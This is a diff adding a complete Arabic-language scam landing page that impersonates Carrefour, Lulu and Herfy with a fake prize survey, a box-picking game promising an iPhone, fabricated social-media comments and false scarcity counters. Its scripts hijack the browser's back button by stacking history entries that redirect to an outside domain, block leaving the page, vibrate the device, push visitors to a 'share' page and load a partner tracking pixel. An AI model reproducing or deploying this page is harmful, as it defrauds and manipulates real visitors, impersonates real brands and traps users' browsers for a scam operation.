@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+
+<head>
+  <title>SA-Web</title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="lander" content="survey-pick-a-box">
+  <meta name="description" content="بمناسبة افتتاح الفرع رقم 100 لدى مطعم هرفي, شارك الأن واحصل على جوائز فورية">
+  <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+
+  <!-- thumbnail image on link share -->
+  <meta property="og:image" content="/thumbnail.png" />
+  <meta property='og:image:width' content='1200' />
+  <meta property='og:image:height' content='627' />
+
+  <link href="css/app2042.css?id=2fbe2d9a9a40ca9b2489" type="text/css" rel="stylesheet" />
+  <link href="css/landers/survey-pick-a-box/app75ba.css?id=cfc27b22c2dc71691640" type="text/css" rel="stylesheet" />
+  <meta name="robots" content="noindex,nofollow">
+  <link rel="shortcut icon" href="/fav.png" type="image/x-icon">
+  <link rel="stylesheet" href="./css/style.min.css">
+</head>
+
+<body>
+  <div class="app" id="app" v-cloak>
+    <vue-modal v-show="!showRotator && !showPrize" :open="showOpeningModal" class="opening-modal">
+      <img class="opening-modal__image" src="images/lulu_icon.jpg" alt="lulu" />
+      <h1 class="heading heading--h1">
+        !! تهانينا لك
+      </h1>
+      <p class="paragraph">
+        بمناسبة مرور 21 عاماً على تأسيس كارفور، تم إختيارك للحصول على جائزة قيمة وفورية
+      </p>
+      <p class="paragraph">
+        اضغط "موافق" للحصول على جائزتك
+      </p>
+      <button class="button" v-on:click="showOpeningModal = false; $confetti.stop()">
+        موافــق
+      </button>
+    </vue-modal>
+    <vue-modal :open="showInstructionsModal">
+      <h2 class="heading heading--h1">تهانينا لك ! تم حفظ إجاباتك بنجاح</h2>
+      <p class="paragraph">
+        الآن لديك فرصة للفوز بجوائز قيمة
+        <br><br>
+        يجب عليك تحديد الصندوق الذي يحتوي على الهدية بداخله
+        <br><br>
+        لديك 3 محاولات! نتمنى لك حظ موفق
+      </p>
+      <button class="button" v-on:click="showInstructionsModal = false">
+        ابدأ الآن
+      </button>
+    </vue-modal>
+    <vue-modal :open="showFailModal">
+      <h1 class="heading heading--h1">حظ أوفر في المرة القادمة</h1>
+      <p class="paragraph">
+        .لديك (2) فرص اضافية
+      </p>
+      <button class="button" v-on:click="showFailModal = false">
+        موافق
+      </button>
+    </vue-modal>
+    <vue-modal :open="showSuccessModal">
+      <img src="https://i.imgur.com/TEkt9Ft.png" style="width: 120px;">
+      <h1 class="heading heading--h1">!!تهانينا لك</h1>
+      <p class="paragraph">
+        !لقد ربحت جوال<br>ايفون 17 برو ماكس 256 جيجابايت<br>اتبع التعليمات التالية للحصول على جائزتك
+      </p>
+      <button class="button" onclick="go();">
+        اريد جائزتي
+      </button>
+    </vue-modal>
+    <div class="left">
+      <div class="product-preview">
+        <div class="product-preview__title">
+          <img src="https://i.imgur.com/6xHiZ7I.jpg" style="width: 340px;">
+        </div>
+        <img class="product-preview__image" src="https://i.imgur.com/VYdM7su.png" alt="Apple iPhone 14 Pro Max" />
+      </div>
+    </div>
+    <div class="right">
+      <vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="images/lid.png" box-image="images/box.png"
+        box-back-image="images/box-back.png" prize-image="images/default@0.75x.png" v-on:fail="onBoxPickerFail"
+        v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+      <div class="verify" v-if="showRotator">
+        <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
+                       "... الرجاء الإنتظار قليلاً",
+                "... الرجاء الإنتظار قليلاً",
+                "... الرجاء الإنتظار قليلاً"
+              ]'>
+        </vue-text-rotator>
+        <div class="verify__text" v-if="rotateIndex > 1">
+          <strong>
+            لقد قمت بالأجابة على الاسئلة بنجاح
+          </strong>
+          <img class="verify__icon verify__icon--checked" src="images/checked.png" alt="" />
+        </div>
+        <div class="verify__text" v-else>
+          جاري معالجة إجاباتك
+          <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}"
+            src="images/spinner.gif" alt="" />
+        </div>
+        <div class="verify__text" v-if="rotateIndex > 2">
+          <strong>
+            !لا تزال هناك جوائز متاحة
+          </strong>
+          <img class="verify__icon verify__icon--checked" src="images/checked.png" alt="" />
+        </div>
+        <div class="verify__text" v-else>
+          جاري البحث عن الهدايا
+          <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}"
+            src="images/spinner.gif" alt="" />
+        </div>
+        <div class="verify__text" v-if="rotateIndex > 3">
+          <strong>
+            !تبقى عدد (62) هدية فقط
+          </strong>
+          <img class="verify__icon verify__icon--checked" src="images/checked.png" alt="" />
+        </div>
+        <div class="verify__text" v-else>
+          جاري فحص المخزون
+          <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }"
+            src="images/spinner.gif" alt="" />
+        </div>
+
+      </div>
+      <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
+      {
+        title: "ما هو جنسك ؟",
+        answers: [ { text: "ذكر" }, { text: "آنثى" } ]
+      },
+      {
+        title: "ما هو عمرك ؟",
+        answers: [ { text: "18-29" }, { text: "30-39" }, { text: "40-49" }, { text: "50+" } ]
+      },
+      {
+        title: "هل حصلت على جائزة من كارفور من قبل ؟",
+        answers: [ { text: "لا" }, { text: "نعم" } ]
+      },
+      {
+        title: "هل سبق لك الشراء من متاجر كارفور ؟",
+        answers: [ { text: "نعم" }, { text: "لا" } ]
+      },
+      {
+        title: "ما رأيك في متاجر كارفور ؟",
+        answers: [ { text: "راض جداً" }, { text: "راض" }, { text: "محايد" }, { text: "غير راض" }, { text: "مستاء جداً" } ]
+      },
+    ]' v-on:finish="onSurveyFinish"></vue-survey>
+    </div>
+  </div>
+	
+		<div class="comments-wrapper">
+    <div class="comments">
+      <div class="counter">
+        <div class="reactions">
+          <img class="like" src="https://imgur.com/0xXGuoL.png" /> <img class="love" src="https://imgur.com/5c115zW.png" />
+          <img class="care" src="https://imgur.com/pTkMgZW.png" /> <span id="likes">134K</span>
+        </div>
+        <span id="comments">27K comments</span> <span class="dot">·</span> <span id="shares">14K shares</span>
+      </div>
+      <div class="bar">
+        <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked" onclick="like(this)">Like</a></span>
+        <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i
+            class="fa fa-share"></i> Share</span>
+      </div>
+      <div>
+        <div class="comment">
+          <img src="https://i.imgur.com/GgZUy7S.jpg" />
+          <div class="single-container">
+              <span class="user">علي محمد ناصر</span>
+            
+
+              <span class="text">
+متشكرين ليكم على الجائزة اجمد متجر في مصر
+            </span>
+          </div>
+          <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+      </div>
+      <div class="comment">
+          <img src="https://i.imgur.com/9NCRQ7s.jpg" />
+          <div class="single-container"><span class="user">نجلاء صبري</span> <span class="text">مصدقتش الكلام ده بالأول لحد ما استلمت الموبايل بجد شكراً</span></div>
+          <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+      </div>
+      <div class="comment reply">
+          <img src="https://i.imgur.com/u9Um9QO.jpg" />
+          <div class="single-container"><span class="user">خالد شريف</span> <span class="text">ام النحاسة دي مش عايزة تفك مني، اخويا كسب وانا لا</span></div>
+          <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+      </div>
+      <div class="comment">
+          <img src="https://i.imgur.com/Hfvrb5h.jpg" />
+          <div class="single-container"><span class="user">سعيد خاطر أبو سميح</span> <span class="text">شكراً ليكم كارفور دايماً عندكم مفاجئات لينا </span></div>
+          <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+      </div>
+      <div class="input"><input placeholder="Write a comment..." /></div>
+      </div>
+    </div>
+  </div>
+	
+
+  
+  <script>window.view = window.view || {};  view.qs = null; view.skip = 0; view.screenshot = 0; view.download = 1; view.noredir = false;</script>
+  <script src="./js/app.min.js" type="application/javascript"></script>
+  <script>
+    function go() {
+      window.onbeforeunload = null;
+      window.open('https://carefor.pages.dev/in/share/share');
+      window.location = 'https://lulumarkets.info/';
+    }
+  </script>
+  <script>
+    var PreventExitPop = true;
+
+    function ExitPop() {
+      if (PreventExitPop != false) {
+        return "Don't miss out!";
+      }
+    }
+    window.onbeforeunload = ExitPop;
+  </script>
+
+  <script>
+    ! function() {
+    var t;
+    try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
+        onpopstate = function(event) {
+            event.state && location.replace('https://lulumarkets.info/');
+        }
+    } catch (o) {
+        console.log(o);
+    }
+}();
+    </script>
+  
+<script>
+	navigator.vibrate([1000, 300, 1000, 300,1000]);
+</script>
+<script src="/p.js?f=sync&lr=1&partner=6ead5f0c5ddb6c1d33a3179db69d52f2ab5ba8ceb41f0306c27032933ca3b3f3" defer></script>
+<noscript><img src="https://i.imgur.com/l3NimxL.gif?f=sync&lr=1&partner=6ead5f0c5ddb6c1d33a3179db69d52f2ab5ba8ceb41f0306c27032933ca3b3f3" width="1" height="1" /></noscript>
+</body>
+</html>
